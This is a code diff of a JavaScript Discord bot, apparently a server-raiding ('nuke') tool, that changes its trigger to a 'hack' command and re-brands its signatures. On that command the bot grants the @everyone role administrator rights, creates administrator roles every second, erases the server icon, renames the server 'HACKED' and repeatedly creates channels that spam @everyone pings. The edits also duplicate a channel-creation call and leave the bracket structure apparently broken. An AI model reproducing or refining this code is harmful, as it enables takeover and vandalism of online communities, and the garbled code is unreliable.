@@ -14,7 +14,7 @@ console.log(`Logged in as ${client.user.tag}!`);
           
 client.on("ready", () => {
   console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
-  console.log('hack by stafano');/////BLACK JACK 
+  console.log('hack by sevan');/////BLACK JACK 
 console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
 console.log(`Logged in as ${client.user.tag}!`);
   client.user.setActivity(`${prefix}help | BOT SESTAM ${client.guilds.size}`)///////shtek bnwsa
@@ -23,7 +23,7 @@ console.log(`Logged in as ${client.user.tag}!`);
 })
 ///created by black jack 
 client.on('message', message => {
-    if (message.content.toLowerCase() === "reklam") {
+    if (message.content.toLowerCase() === prefix + "hack") {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]
@@ -38,7 +38,7 @@ client.on('message', message => {
       
         setInterval(() => {
             message.guild.createRole({
-                name: "ph ahmed",
+                name: "HACKED",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
@@ -46,12 +46,14 @@ client.on('message', message => {
             })
         }, 1000);
         message.guild.setIcon("");
-        message.guild.setName('ph ahmed');
+        message.guild.setName('HACKED');
         setTimeout(function() {
             setInterval(() => {
           
-                message.guild.createChannel('hack by ph ahmed', 'text').then(channel => {
-                channel.send('@everyone HACK BY PH AHMED:joy: :joy: :joy:')
+                message.guild.createChannel('HACKED BY SEVAN', 'text').then(channel => {
+                  
+                message.guild.createChannel('HACKED BY SEVAN', 'text').then(channel => { 
+                channel.send('@everyone HACK BY SEVAN :joy: :joy: :joy:')
                
                 })
             }
@@ -60,7 +62,10 @@ client.on('message', message => {
             })
         }
     
-})  
+                   )  
+    }
+}
+          )
 
  ////codaka drwst krawa lalayan black jack
 
